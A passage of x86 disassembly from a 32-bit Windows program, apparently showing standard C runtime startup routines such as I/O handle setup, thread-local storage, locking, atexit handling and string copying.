  424f47:	mov    DWORD PTR ds:0x463718,0x1
  424f51:	jmp    0x424f71
  424f53:	call   DWORD PTR ds:0x429030
  424f59:	cmp    eax,0x78
  424f5c:	jne    0x424f67
  424f5e:	mov    eax,ebp
  424f60:	mov    ds:0x463718,eax
  424f65:	jmp    0x424f6c
  424f67:	mov    eax,ds:0x463718
  424f6c:	cmp    eax,0x1
  424f6f:	jne    0x424fee
  424f71:	cmp    esi,ebx
  424f73:	jne    0x424f7d
  424f75:	call   edi
  424f77:	mov    esi,eax
  424f79:	cmp    esi,ebx
  424f7b:	je     0x424ff6
  424f7d:	cmp    WORD PTR [esi],bx
  424f80:	mov    eax,esi
  424f82:	je     0x424f92
  424f84:	add    eax,ebp
  424f86:	cmp    WORD PTR [eax],bx
  424f89:	jne    0x424f84
  424f8b:	add    eax,ebp
  424f8d:	cmp    WORD PTR [eax],bx
  424f90:	jne    0x424f84
  424f92:	mov    edi,DWORD PTR ds:0x4290bc
  424f98:	push   ebx
  424f99:	push   ebx
  424f9a:	push   ebx
  424f9b:	sub    eax,esi
  424f9d:	push   ebx
  424f9e:	sar    eax,1
  424fa0:	inc    eax
  424fa1:	push   eax
  424fa2:	push   esi
  424fa3:	push   ebx
  424fa4:	push   ebx
  424fa5:	mov    DWORD PTR [esp+0x34],eax
  424fa9:	call   edi
  424fab:	mov    ebp,eax
  424fad:	cmp    ebp,ebx
  424faf:	je     0x424fe3
  424fb1:	push   ebp
  424fb2:	call   0x426152
  424fb7:	cmp    eax,ebx
  424fb9:	pop    ecx
  424fba:	mov    DWORD PTR [esp+0x10],eax
  424fbe:	je     0x424fe3
  424fc0:	push   ebx
  424fc1:	push   ebx
  424fc2:	push   ebp
  424fc3:	push   eax
  424fc4:	push   DWORD PTR [esp+0x24]
  424fc8:	push   esi
  424fc9:	push   ebx
  424fca:	push   ebx
  424fcb:	call   edi
  424fcd:	test   eax,eax
  424fcf:	jne    0x424fdf
  424fd1:	push   DWORD PTR [esp+0x10]
  424fd5:	call   0x42603a
  424fda:	pop    ecx
  424fdb:	mov    DWORD PTR [esp+0x10],ebx
  424fdf:	mov    ebx,DWORD PTR [esp+0x10]
  424fe3:	push   esi
  424fe4:	call   DWORD PTR ds:0x4290b8
  424fea:	mov    eax,ebx
  424fec:	jmp    0x42503e
  424fee:	cmp    eax,ebp
  424ff0:	je     0x424ffa
  424ff2:	cmp    eax,ebx
  424ff4:	je     0x424ffa
  424ff6:	xor    eax,eax
  424ff8:	jmp    0x42503e
  424ffa:	call   DWORD PTR ds:0x4290b4
  425000:	mov    esi,eax
  425002:	cmp    esi,ebx
  425004:	je     0x424ff6
  425006:	cmp    BYTE PTR [esi],bl
  425008:	je     0x425014
  42500a:	inc    eax
  42500b:	cmp    BYTE PTR [eax],bl
  42500d:	jne    0x42500a
  42500f:	inc    eax
  425010:	cmp    BYTE PTR [eax],bl
  425012:	jne    0x42500a
  425014:	sub    eax,esi
  425016:	inc    eax
  425017:	mov    ebp,eax
  425019:	push   ebp
  42501a:	call   0x426152
  42501f:	mov    edi,eax
  425021:	cmp    edi,ebx
  425023:	pop    ecx
  425024:	jne    0x42502a
  425026:	xor    edi,edi
  425028:	jmp    0x425035
  42502a:	push   ebp
  42502b:	push   esi
  42502c:	push   edi
  42502d:	call   0x426170
  425032:	add    esp,0xc
  425035:	push   esi
  425036:	call   DWORD PTR ds:0x4290b0
  42503c:	mov    eax,edi
  42503e:	pop    edi
  42503f:	pop    esi
  425040:	pop    ebp
  425041:	pop    ebx
  425042:	pop    ecx
  425043:	pop    ecx
  425044:	ret    
  425045:	sub    esp,0x48
  425048:	push   ebx
  425049:	mov    ebx,0x480
  42504e:	push   ebx
  42504f:	call   0x426152
  425054:	test   eax,eax
  425056:	pop    ecx
  425057:	jne    0x425061
  425059:	or     eax,0xffffffff
  42505c:	jmp    0x42523e
  425061:	mov    ds:0x463c60,eax
  425066:	mov    DWORD PTR ds:0x463c48,0x20
  425070:	lea    ecx,[eax+0x480]
  425076:	jmp    0x425096
  425078:	and    BYTE PTR [eax+0x4],0x0
  42507c:	or     DWORD PTR [eax],0xffffffff
  42507f:	and    DWORD PTR [eax+0x8],0x0
  425083:	mov    BYTE PTR [eax+0x5],0xa
  425087:	mov    ecx,DWORD PTR ds:0x463c60
  42508d:	add    eax,0x24
  425090:	add    ecx,0x480
  425096:	cmp    eax,ecx
  425098:	jb     0x425078
  42509a:	push   ebp
  42509b:	push   esi
  42509c:	push   edi
  42509d:	lea    eax,[esp+0x14]
  4250a1:	push   eax
  4250a2:	call   DWORD PTR ds:0x429090
  4250a8:	cmp    WORD PTR [esp+0x46],0x0
  4250ae:	je     0x42519d
  4250b4:	mov    eax,DWORD PTR [esp+0x48]
  4250b8:	test   eax,eax
  4250ba:	je     0x42519d
  4250c0:	mov    edi,DWORD PTR [eax]
  4250c2:	lea    ebp,[eax+0x4]
  4250c5:	lea    eax,[edi+ebp*1]
  4250c8:	mov    DWORD PTR [esp+0x10],eax
  4250cc:	mov    eax,0x800
  4250d1:	cmp    edi,eax
  4250d3:	jl     0x4250d7
  4250d5:	mov    edi,eax
  4250d7:	cmp    DWORD PTR ds:0x463c48,edi
  4250dd:	jge    0x42512d
  4250df:	mov    esi,0x463c64
  4250e4:	push   ebx
  4250e5:	call   0x426152
  4250ea:	test   eax,eax
  4250ec:	pop    ecx
  4250ed:	je     0x425127
  4250ef:	add    DWORD PTR ds:0x463c48,0x20
  4250f6:	mov    DWORD PTR [esi],eax
  4250f8:	lea    ecx,[eax+0x480]
  4250fe:	jmp    0x425116
  425100:	and    BYTE PTR [eax+0x4],0x0
  425104:	or     DWORD PTR [eax],0xffffffff
  425107:	and    DWORD PTR [eax+0x8],0x0
  42510b:	mov    BYTE PTR [eax+0x5],0xa
  42510f:	mov    ecx,DWORD PTR [esi]
  425111:	add    eax,0x24
  425114:	add    ecx,ebx
  425116:	cmp    eax,ecx
  425118:	jb     0x425100
  42511a:	add    esi,0x4
  42511d:	cmp    DWORD PTR ds:0x463c48,edi
  425123:	jl     0x4250e4
  425125:	jmp    0x42512d
  425127:	mov    edi,DWORD PTR ds:0x463c48
  42512d:	xor    ebx,ebx
  42512f:	test   edi,edi
  425131:	jle    0x42519d
  425133:	mov    eax,DWORD PTR [esp+0x10]
  425137:	mov    eax,DWORD PTR [eax]
  425139:	cmp    eax,0xffffffff
  42513c:	je     0x425192
  42513e:	mov    cl,BYTE PTR [ebp+0x0]
  425141:	test   cl,0x1
  425144:	je     0x425192
  425146:	test   cl,0x8
  425149:	jne    0x425156
  42514b:	push   eax
  42514c:	call   DWORD PTR ds:0x4290c8
  425152:	test   eax,eax
  425154:	je     0x425192
  425156:	mov    ecx,ebx
  425158:	mov    eax,ebx
  42515a:	and    eax,0x1f
  42515d:	lea    eax,[eax+eax*8]
  425160:	sar    ecx,0x5
  425163:	mov    ecx,DWORD PTR [ecx*4+0x463c60]
  42516a:	lea    esi,[ecx+eax*4]
  42516d:	mov    eax,DWORD PTR [esp+0x10]
  425171:	mov    eax,DWORD PTR [eax]
  425173:	mov    DWORD PTR [esi],eax
  425175:	mov    al,BYTE PTR [ebp+0x0]
  425178:	mov    BYTE PTR [esi+0x4],al
  42517b:	lea    eax,[esi+0xc]
  42517e:	push   0xfa0
  425183:	push   eax
  425184:	call   0x4264bd
  425189:	test   eax,eax
  42518b:	pop    ecx
  42518c:	pop    ecx
  42518d:	je     0x4251bd
  42518f:	inc    DWORD PTR [esi+0x8]
  425192:	add    DWORD PTR [esp+0x10],0x4
  425197:	inc    ebx
  425198:	inc    ebp
  425199:	cmp    ebx,edi
  42519b:	jl     0x425133
  42519d:	xor    ebx,ebx
  42519f:	mov    ecx,DWORD PTR ds:0x463c60
  4251a5:	lea    eax,[ebx+ebx*8]
  4251a8:	lea    esi,[ecx+eax*4]
  4251ab:	cmp    DWORD PTR [esi],0xffffffff
  4251ae:	jne    0x42521f
  4251b0:	test   ebx,ebx
  4251b2:	mov    BYTE PTR [esi+0x4],0x81
  4251b6:	jne    0x4251c2
  4251b8:	push   0xfffffff6
  4251ba:	pop    eax
  4251bb:	jmp    0x4251cc
  4251bd:	or     eax,0xffffffff
  4251c0:	jmp    0x42523b
  4251c2:	mov    eax,ebx
  4251c4:	dec    eax
  4251c5:	neg    eax
  4251c7:	sbb    eax,eax
  4251c9:	add    eax,0xfffffff5
  4251cc:	push   eax
  4251cd:	call   DWORD PTR ds:0x4290a4
  4251d3:	mov    edi,eax
  4251d5:	cmp    edi,0xffffffff
  4251d8:	je     0x425219
  4251da:	push   edi
  4251db:	call   DWORD PTR ds:0x4290c8
  4251e1:	test   eax,eax
  4251e3:	je     0x425219
  4251e5:	and    eax,0xff
  4251ea:	cmp    eax,0x2
  4251ed:	mov    DWORD PTR [esi],edi
  4251ef:	jne    0x4251f7
  4251f1:	or     BYTE PTR [esi+0x4],0x40
  4251f5:	jmp    0x425200
  4251f7:	cmp    eax,0x3
  4251fa:	jne    0x425200
  4251fc:	or     BYTE PTR [esi+0x4],0x8
  425200:	lea    eax,[esi+0xc]
  425203:	push   0xfa0
  425208:	push   eax
  425209:	call   0x4264bd
  42520e:	test   eax,eax
  425210:	pop    ecx
  425211:	pop    ecx
  425212:	je     0x4251bd
  425214:	inc    DWORD PTR [esi+0x8]
  425217:	jmp    0x425223
  425219:	or     BYTE PTR [esi+0x4],0x40
  42521d:	jmp    0x425223
  42521f:	or     BYTE PTR [esi+0x4],0x80
  425223:	inc    ebx
  425224:	cmp    ebx,0x3
  425227:	jl     0x42519f
  42522d:	push   DWORD PTR ds:0x463c48
  425233:	call   DWORD PTR ds:0x4290c4
  425239:	xor    eax,eax
  42523b:	pop    edi
  42523c:	pop    esi
  42523d:	pop    ebp
  42523e:	pop    ebx
  42523f:	add    esp,0x48
  425242:	ret    
  425243:	push   0xc
  425245:	push   0x4295f8
  42524a:	call   0x425434
  42524f:	mov    DWORD PTR [ebp-0x1c],0x42a050
  425256:	cmp    DWORD PTR [ebp-0x1c],0x42a050
  42525d:	jae    0x425281
  42525f:	and    DWORD PTR [ebp-0x4],0x0
  425263:	mov    eax,DWORD PTR [ebp-0x1c]
  425266:	mov    eax,DWORD PTR [eax]
  425268:	test   eax,eax
  42526a:	je     0x425277
  42526c:	call   eax
  42526e:	jmp    0x425277
  425270:	xor    eax,eax
  425272:	inc    eax
  425273:	ret    
  425274:	mov    esp,DWORD PTR [ebp-0x18]
  425277:	or     DWORD PTR [ebp-0x4],0xffffffff
  42527b:	add    DWORD PTR [ebp-0x1c],0x4
  42527f:	jmp    0x425256
  425281:	call   0x42546f
  425286:	ret    
  425287:	push   0xc
  425289:	push   0x429608
  42528e:	call   0x425434
  425293:	mov    DWORD PTR [ebp-0x1c],0x42a058
  42529a:	cmp    DWORD PTR [ebp-0x1c],0x42a058
  4252a1:	jae    0x4252c5
  4252a3:	and    DWORD PTR [ebp-0x4],0x0
  4252a7:	mov    eax,DWORD PTR [ebp-0x1c]
  4252aa:	mov    eax,DWORD PTR [eax]
  4252ac:	test   eax,eax
  4252ae:	je     0x4252bb
  4252b0:	call   eax
  4252b2:	jmp    0x4252bb
  4252b4:	xor    eax,eax
  4252b6:	inc    eax
  4252b7:	ret    
  4252b8:	mov    esp,DWORD PTR [ebp-0x18]
  4252bb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4252bf:	add    DWORD PTR [ebp-0x1c],0x4
  4252c3:	jmp    0x42529a
  4252c5:	call   0x42546f
  4252ca:	ret    
  4252cb:	call   0x425506
  4252d0:	mov    eax,ds:0x462dfc
  4252d5:	cmp    eax,0xffffffff
  4252d8:	je     0x4252e8
  4252da:	push   eax
  4252db:	call   DWORD PTR ds:0x4290d0
  4252e1:	or     DWORD PTR ds:0x462dfc,0xffffffff
  4252e8:	ret    
  4252e9:	push   ebx
  4252ea:	push   esi
  4252eb:	call   DWORD PTR ds:0x429030
  4252f1:	push   DWORD PTR ds:0x462dfc
  4252f7:	mov    ebx,eax
  4252f9:	call   DWORD PTR ds:0x4290e0
  4252ff:	mov    esi,eax
  425301:	test   esi,esi
  425303:	jne    0x42534e
  425305:	push   0x88
  42530a:	push   0x1
  42530c:	call   0x426548
  425311:	mov    esi,eax
  425313:	test   esi,esi
  425315:	pop    ecx
  425316:	pop    ecx
  425317:	je     0x425346
  425319:	push   esi
  42531a:	push   DWORD PTR ds:0x462dfc
  425320:	call   DWORD PTR ds:0x4290dc
  425326:	test   eax,eax
  425328:	je     0x425346
  42532a:	mov    DWORD PTR [esi+0x54],0x462d50
  425331:	mov    DWORD PTR [esi+0x14],0x1
  425338:	call   DWORD PTR ds:0x4290d8
  42533e:	or     DWORD PTR [esi+0x4],0xffffffff
  425342:	mov    DWORD PTR [esi],eax
  425344:	jmp    0x42534e
  425346:	push   0x10
  425348:	call   0x4244fc
  42534d:	pop    ecx
  42534e:	push   ebx
  42534f:	call   DWORD PTR ds:0x4290d4
  425355:	mov    eax,esi
  425357:	pop    esi
  425358:	pop    ebx
  425359:	ret    
  42535a:	call   0x4254bd
  42535f:	test   eax,eax
  425361:	je     0x425373
  425363:	call   DWORD PTR ds:0x4290e4
  425369:	cmp    eax,0xffffffff
  42536c:	mov    ds:0x462dfc,eax
  425371:	jne    0x42537b
  425373:	call   0x4252cb
  425378:	xor    eax,eax
  42537a:	ret    
  42537b:	push   esi
  42537c:	push   0x88
  425381:	push   0x1
  425383:	call   0x426548
  425388:	mov    esi,eax
  42538a:	test   esi,esi
  42538c:	pop    ecx
  42538d:	pop    ecx
  42538e:	je     0x4253c0
  425390:	push   esi
  425391:	push   DWORD PTR ds:0x462dfc
  425397:	call   DWORD PTR ds:0x4290dc
  42539d:	test   eax,eax
  42539f:	je     0x4253c0
  4253a1:	mov    DWORD PTR [esi+0x54],0x462d50
  4253a8:	mov    DWORD PTR [esi+0x14],0x1
  4253af:	call   DWORD PTR ds:0x4290d8
  4253b5:	or     DWORD PTR [esi+0x4],0xffffffff
  4253b9:	mov    DWORD PTR [esi],eax
  4253bb:	xor    eax,eax
  4253bd:	inc    eax
  4253be:	pop    esi
  4253bf:	ret    
  4253c0:	call   0x4252cb
  4253c5:	xor    eax,eax
  4253c7:	pop    esi
  4253c8:	ret    
  4253c9:	cmp    DWORD PTR ds:0x4635c4,0x2
  4253d0:	jne    0x4253df
  4253d2:	cmp    DWORD PTR ds:0x4635d0,0x5
  4253d9:	jb     0x4253df
  4253db:	xor    eax,eax
  4253dd:	inc    eax
  4253de:	ret    
  4253df:	push   0x3
  4253e1:	pop    eax
  4253e2:	ret    
  4253e3:	xor    eax,eax
  4253e5:	cmp    DWORD PTR [esp+0x4],eax
  4253e9:	push   0x0
  4253eb:	sete   al
  4253ee:	push   0x1000
  4253f3:	push   eax
  4253f4:	call   DWORD PTR ds:0x429040
  4253fa:	test   eax,eax
  4253fc:	mov    ds:0x463c40,eax
  425401:	je     0x42542d
  425403:	call   0x4253c9
  425408:	cmp    eax,0x3
  42540b:	mov    ds:0x463c44,eax
  425410:	jne    0x425430
  425412:	push   0x3f8
  425417:	call   0x4267ca
  42541c:	test   eax,eax
  42541e:	pop    ecx
  42541f:	jne    0x425430
  425421:	push   DWORD PTR ds:0x463c40
  425427:	call   DWORD PTR ds:0x4290e8
  42542d:	xor    eax,eax
  42542f:	ret    
  425430:	xor    eax,eax
  425432:	inc    eax
  425433:	ret    
  425434:	push   0x4272f8
  425439:	mov    eax,fs:0x0
  42543f:	push   eax
  425440:	mov    eax,DWORD PTR [esp+0x10]
  425444:	mov    DWORD PTR [esp+0x10],ebp
  425448:	lea    ebp,[esp+0x10]
  42544c:	sub    esp,eax
  42544e:	push   ebx
  42544f:	push   esi
  425450:	push   edi
  425451:	mov    eax,DWORD PTR [ebp-0x8]
  425454:	mov    DWORD PTR [ebp-0x18],esp
  425457:	push   eax
  425458:	mov    eax,DWORD PTR [ebp-0x4]
  42545b:	mov    DWORD PTR [ebp-0x4],0xffffffff
  425462:	mov    DWORD PTR [ebp-0x8],eax
  425465:	lea    eax,[ebp-0x10]
  425468:	mov    fs:0x0,eax
  42546e:	ret    
  42546f:	mov    ecx,DWORD PTR [ebp-0x10]
  425472:	mov    DWORD PTR fs:0x0,ecx
  425479:	pop    ecx
  42547a:	pop    edi
  42547b:	pop    esi
  42547c:	pop    ebx
  42547d:	leave  
  42547e:	push   ecx
  42547f:	ret    
  425480:	cmp    eax,0x1000
  425485:	jae    0x425495
  425487:	neg    eax
  425489:	add    eax,esp
  42548b:	add    eax,0x4
  42548e:	test   DWORD PTR [eax],eax
  425490:	xchg   esp,eax
  425491:	mov    eax,DWORD PTR [eax]
  425493:	push   eax
  425494:	ret    
  425495:	push   ecx
  425496:	lea    ecx,[esp+0x8]
  42549a:	sub    ecx,0x1000
  4254a0:	sub    eax,0x1000
  4254a5:	test   DWORD PTR [ecx],eax
  4254a7:	cmp    eax,0x1000
  4254ac:	jae    0x42549a
  4254ae:	sub    ecx,eax
  4254b0:	mov    eax,esp
  4254b2:	test   DWORD PTR [ecx],eax
  4254b4:	mov    esp,ecx
  4254b6:	mov    ecx,DWORD PTR [eax]
  4254b8:	mov    eax,DWORD PTR [eax+0x4]
  4254bb:	push   eax
  4254bc:	ret    
  4254bd:	push   esi
  4254be:	push   edi
  4254bf:	xor    esi,esi
  4254c1:	mov    edi,0x463720
  4254c6:	cmp    DWORD PTR [esi*8+0x462e14],0x1
  4254ce:	jne    0x4254ee
  4254d0:	lea    eax,[esi*8+0x462e10]
  4254d7:	mov    DWORD PTR [eax],edi
  4254d9:	push   0xfa0
  4254de:	push   DWORD PTR [eax]
  4254e0:	add    edi,0x18
  4254e3:	call   0x4264bd
  4254e8:	test   eax,eax
  4254ea:	pop    ecx
  4254eb:	pop    ecx
  4254ec:	je     0x4254fa
  4254ee:	inc    esi
  4254ef:	cmp    esi,0x24
  4254f2:	jl     0x4254c6
  4254f4:	xor    eax,eax
  4254f6:	inc    eax
  4254f7:	pop    edi
  4254f8:	pop    esi
  4254f9:	ret    
  4254fa:	and    DWORD PTR [esi*8+0x462e10],0x0
  425502:	xor    eax,eax
  425504:	jmp    0x4254f7
  425506:	push   ebx
  425507:	mov    ebx,DWORD PTR ds:0x4290cc
  42550d:	push   esi
  42550e:	mov    esi,0x462e10
  425513:	push   edi
  425514:	mov    edi,DWORD PTR [esi]
  425516:	test   edi,edi
  425518:	je     0x42552d
  42551a:	cmp    DWORD PTR [esi+0x4],0x1
  42551e:	je     0x42552d
  425520:	push   edi
  425521:	call   ebx
  425523:	push   edi
  425524:	call   0x42603a
  425529:	and    DWORD PTR [esi],0x0
  42552c:	pop    ecx
  42552d:	add    esi,0x8
  425530:	cmp    esi,0x462f30
  425536:	jl     0x425514
  425538:	mov    esi,0x462e10
  42553d:	pop    edi
  42553e:	mov    eax,DWORD PTR [esi]
  425540:	test   eax,eax
  425542:	je     0x42554d
  425544:	cmp    DWORD PTR [esi+0x4],0x1
  425548:	jne    0x42554d
  42554a:	push   eax
  42554b:	call   ebx
  42554d:	add    esi,0x8
  425550:	cmp    esi,0x462f30
  425556:	jl     0x42553e
  425558:	pop    esi
  425559:	pop    ebx
  42555a:	ret    
  42555b:	push   ebp
  42555c:	mov    ebp,esp
  42555e:	mov    eax,DWORD PTR [ebp+0x8]
  425561:	push   DWORD PTR [eax*8+0x462e10]
  425568:	call   DWORD PTR ds:0x4290f0
  42556e:	pop    ebp
  42556f:	ret    
  425570:	push   ebp
  425571:	mov    ebp,esp
  425573:	push   esi
  425574:	mov    esi,DWORD PTR [ebp+0x8]
  425577:	lea    esi,[esi*8+0x462e10]
  42557e:	cmp    DWORD PTR [esi],0x0
  425581:	je     0x425588
  425583:	xor    eax,eax
  425585:	inc    eax
  425586:	jmp    0x4255ec
  425588:	push   edi
  425589:	push   0x18
  42558b:	call   0x426152
  425590:	mov    edi,eax
  425592:	test   edi,edi
  425594:	pop    ecx
  425595:	jne    0x4255a6
  425597:	call   0x4273d0
  42559c:	mov    DWORD PTR [eax],0xc
  4255a2:	xor    eax,eax
  4255a4:	jmp    0x4255eb
  4255a6:	push   0xa
  4255a8:	call   0x4255ef
  4255ad:	cmp    DWORD PTR [esi],0x0
  4255b0:	pop    ecx
  4255b1:	jne    0x4255d9
  4255b3:	push   0xfa0
  4255b8:	push   edi
  4255b9:	call   0x4264bd
  4255be:	test   eax,eax
  4255c0:	pop    ecx
  4255c1:	pop    ecx
  4255c2:	jne    0x4255d5
  4255c4:	push   edi
  4255c5:	call   0x42603a
  4255ca:	push   0xa
  4255cc:	call   0x42555b
  4255d1:	pop    ecx
  4255d2:	pop    ecx
  4255d3:	jmp    0x425597
  4255d5:	mov    DWORD PTR [esi],edi
  4255d7:	jmp    0x4255e0
  4255d9:	push   edi
  4255da:	call   0x42603a
  4255df:	pop    ecx
  4255e0:	push   0xa
  4255e2:	call   0x42555b
  4255e7:	xor    eax,eax
  4255e9:	pop    ecx
  4255ea:	inc    eax
  4255eb:	pop    edi
  4255ec:	pop    esi
  4255ed:	pop    ebp
  4255ee:	ret    
  4255ef:	push   ebp
  4255f0:	mov    ebp,esp
  4255f2:	mov    eax,DWORD PTR [ebp+0x8]
  4255f5:	push   esi
  4255f6:	lea    esi,[eax*8+0x462e10]
  4255fd:	cmp    DWORD PTR [esi],0x0
  425600:	jne    0x425615
  425602:	push   eax
  425603:	call   0x425570
  425608:	test   eax,eax
  42560a:	pop    ecx
  42560b:	jne    0x425615
  42560d:	push   0x11
  42560f:	call   0x4244fc
  425614:	pop    ecx
  425615:	push   DWORD PTR [esi]
  425617:	call   DWORD PTR ds:0x4290f4
  42561d:	pop    esi
  42561e:	pop    ebp
  42561f:	ret    
  425620:	push   esi
  425621:	push   DWORD PTR ds:0x463d68
  425627:	call   0x427586
  42562c:	pop    ecx
  42562d:	mov    ecx,DWORD PTR ds:0x463d64
  425633:	mov    esi,eax
  425635:	mov    eax,ds:0x463d68
  42563a:	mov    edx,ecx
  42563c:	sub    edx,eax
  42563e:	add    edx,0x4
  425641:	cmp    esi,edx
  425643:	jae    0x425693
  425645:	mov    ecx,0x800
  42564a:	cmp    esi,ecx
  42564c:	jae    0x425650
  42564e:	mov    ecx,esi
  425650:	add    ecx,esi
  425652:	push   ecx
  425653:	push   eax
  425654:	call   0x4273d9
  425659:	test   eax,eax
  42565b:	pop    ecx
  42565c:	pop    ecx
  42565d:	jne    0x425676
  42565f:	add    esi,0x10
  425662:	push   esi
  425663:	push   DWORD PTR ds:0x463d68
  425669:	call   0x4273d9
  42566e:	test   eax,eax
  425670:	pop    ecx
  425671:	pop    ecx
  425672:	jne    0x425676
  425674:	pop    esi
  425675:	ret    
  425676:	mov    ecx,DWORD PTR ds:0x463d64
  42567c:	sub    ecx,DWORD PTR ds:0x463d68
  425682:	mov    ds:0x463d68,eax
  425687:	sar    ecx,0x2
  42568a:	lea    ecx,[eax+ecx*4]
  42568d:	mov    DWORD PTR ds:0x463d64,ecx
  425693:	mov    DWORD PTR [ecx],edi
  425695:	add    DWORD PTR ds:0x463d64,0x4
  42569c:	mov    eax,edi
  42569e:	pop    esi
  42569f:	ret    
  4256a0:	push   0x80
  4256a5:	call   0x426152
  4256aa:	test   eax,eax
  4256ac:	pop    ecx
  4256ad:	mov    ds:0x463d68,eax
  4256b2:	jne    0x4256b8
  4256b4:	push   0x18
  4256b6:	pop    eax
  4256b7:	ret    
  4256b8:	and    DWORD PTR [eax],0x0
  4256bb:	mov    eax,ds:0x463d68
  4256c0:	mov    ds:0x463d64,eax
  4256c5:	xor    eax,eax
  4256c7:	ret    
  4256c8:	push   0xc
  4256ca:	push   0x429618
  4256cf:	call   0x425434
  4256d4:	call   0x424747
  4256d9:	and    DWORD PTR [ebp-0x4],0x0
  4256dd:	mov    edi,DWORD PTR [ebp+0x8]
  4256e0:	call   0x425620
  4256e5:	mov    DWORD PTR [ebp-0x1c],eax
  4256e8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4256ec:	call   0x4256fa
  4256f1:	mov    eax,DWORD PTR [ebp-0x1c]
  4256f4:	call   0x42546f
  4256f9:	ret    
  4256fa:	call   0x424750
  4256ff:	ret    
  425700:	push   DWORD PTR [esp+0x4]
  425704:	call   0x4256c8
  425709:	neg    eax
  42570b:	sbb    eax,eax
  42570d:	neg    eax
  42570f:	pop    ecx
  425710:	dec    eax
  425711:	ret    
  425712:	push   ebp
  425713:	mov    ebp,esp
  425715:	sub    esp,0x10
  425718:	push   ebx
  425719:	xor    ebx,ebx
  42571b:	cmp    DWORD PTR ds:0x463870,ebx
  425721:	push   esi
  425722:	push   edi
  425723:	jne    0x425792
  425725:	push   0x429688
  42572a:	call   DWORD PTR ds:0x4290f8
  425730:	mov    edi,eax
  425732:	cmp    edi,ebx
  425734:	je     0x4257cd
  42573a:	mov    esi,DWORD PTR ds:0x429028
  425740:	push   0x42967c
  425745:	push   edi
  425746:	call   esi
  425748:	test   eax,eax
  42574a:	mov    ds:0x463870,eax
  42574f:	je     0x4257cd
  425751:	push   0x42966c
  425756:	push   edi
  425757:	call   esi
  425759:	push   0x429658
  42575e:	push   edi
  42575f:	mov    ds:0x463874,eax
  425764:	call   esi
  425766:	cmp    DWORD PTR ds:0x4635c4,0x2
  42576d:	mov    ds:0x463878,eax
  425772:	jne    0x425792
  425774:	push   0x42963c
  425779:	push   edi
  42577a:	call   esi
  42577c:	test   eax,eax
  42577e:	mov    ds:0x463880,eax
  425783:	je     0x425792
  425785:	push   0x429624
  42578a:	push   edi
  42578b:	call   esi
  42578d:	mov    ds:0x46387c,eax
  425792:	mov    eax,ds:0x46387c
  425797:	test   eax,eax
  425799:	je     0x4257d7
  42579b:	call   eax
  42579d:	test   eax,eax
  42579f:	je     0x4257be
  4257a1:	lea    ecx,[ebp-0x4]
  4257a4:	push   ecx
  4257a5:	push   0xc
  4257a7:	lea    ecx,[ebp-0x10]
  4257aa:	push   ecx
  4257ab:	push   0x1
  4257ad:	push   eax
  4257ae:	call   DWORD PTR ds:0x463880
  4257b4:	test   eax,eax
  4257b6:	je     0x4257be
  4257b8:	test   BYTE PTR [ebp-0x8],0x1
  4257bc:	jne    0x4257d7
  4257be:	cmp    DWORD PTR ds:0x4635d0,0x4
  4257c5:	jb     0x4257d1
  4257c7:	or     BYTE PTR [ebp+0x12],0x20
  4257cb:	jmp    0x4257f6
  4257cd:	xor    eax,eax
  4257cf:	jmp    0x425806
  4257d1:	or     BYTE PTR [ebp+0x12],0x4
  4257d5:	jmp    0x4257f6
  4257d7:	mov    eax,ds:0x463874
  4257dc:	test   eax,eax
  4257de:	je     0x4257f6
  4257e0:	call   eax
  4257e2:	mov    ebx,eax
  4257e4:	test   ebx,ebx
  4257e6:	je     0x4257f6
  4257e8:	mov    eax,ds:0x463878
  4257ed:	test   eax,eax
  4257ef:	je     0x4257f6
  4257f1:	push   ebx
  4257f2:	call   eax
  4257f4:	mov    ebx,eax
  4257f6:	push   DWORD PTR [ebp+0x10]
  4257f9:	push   DWORD PTR [ebp+0xc]
  4257fc:	push   DWORD PTR [ebp+0x8]
  4257ff:	push   ebx
  425800:	call   DWORD PTR ds:0x463870
  425806:	pop    edi
  425807:	pop    esi
  425808:	pop    ebx
  425809:	leave  
  42580a:	ret    
  42580b:	int3   
  42580c:	int3   
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   edi
  425811:	mov    edi,DWORD PTR [esp+0x8]
  425815:	jmp    0x425885
  425817:	lea    esp,[esp+0x0]
  42581e:	mov    edi,edi
  425820:	mov    ecx,DWORD PTR [esp+0x4]
  425824:	push   edi
  425825:	test   ecx,0x3
  42582b:	je     0x425840
  42582d:	mov    al,BYTE PTR [ecx]
  42582f:	add    ecx,0x1
  425832:	test   al,al
  425834:	je     0x425873
  425836:	test   ecx,0x3
  42583c:	jne    0x42582d
  42583e:	mov    edi,edi
  425840:	mov    eax,DWORD PTR [ecx]
  425842:	mov    edx,0x7efefeff
  425847:	add    edx,eax
  425849:	xor    eax,0xffffffff
  42584c:	xor    eax,edx
  42584e:	add    ecx,0x4
  425851:	test   eax,0x81010100
  425856:	je     0x425840
  425858:	mov    eax,DWORD PTR [ecx-0x4]
  42585b:	test   al,al
  42585d:	je     0x425882
  42585f:	test   ah,ah
  425861:	je     0x42587d
  425863:	test   eax,0xff0000
  425868:	je     0x425878
  42586a:	test   eax,0xff000000
  42586f:	je     0x425873
  425871:	jmp    0x425840
  425873:	lea    edi,[ecx-0x1]
  425876:	jmp    0x425885
  425878:	lea    edi,[ecx-0x2]
  42587b:	jmp    0x425885
  42587d:	lea    edi,[ecx-0x3]
  425880:	jmp    0x425885
  425882:	lea    edi,[ecx-0x4]
  425885:	mov    ecx,DWORD PTR [esp+0xc]
  425889:	test   ecx,0x3
  42588f:	je     0x4258ae
  425891:	mov    dl,BYTE PTR [ecx]
  425893:	add    ecx,0x1
  425896:	test   dl,dl
  425898:	je     0x425900
  42589a:	mov    BYTE PTR [edi],dl
  42589c:	add    edi,0x1
  42589f:	test   ecx,0x3
  4258a5:	jne    0x425891
  4258a7:	jmp    0x4258ae
  4258a9:	mov    DWORD PTR [edi],edx
  4258ab:	add    edi,0x4
  4258ae:	mov    edx,0x7efefeff
  4258b3:	mov    eax,DWORD PTR [ecx]
  4258b5:	add    edx,eax
  4258b7:	xor    eax,0xffffffff
  4258ba:	xor    eax,edx
  4258bc:	mov    edx,DWORD PTR [ecx]
  4258be:	add    ecx,0x4
  4258c1:	test   eax,0x81010100
  4258c6:	je     0x4258a9
  4258c8:	test   dl,dl
  4258ca:	je     0x425900
  4258cc:	test   dh,dh
  4258ce:	je     0x4258f7
  4258d0:	test   edx,0xff0000
  4258d6:	je     0x4258ea
  4258d8:	test   edx,0xff000000
  4258de:	je     0x4258e2
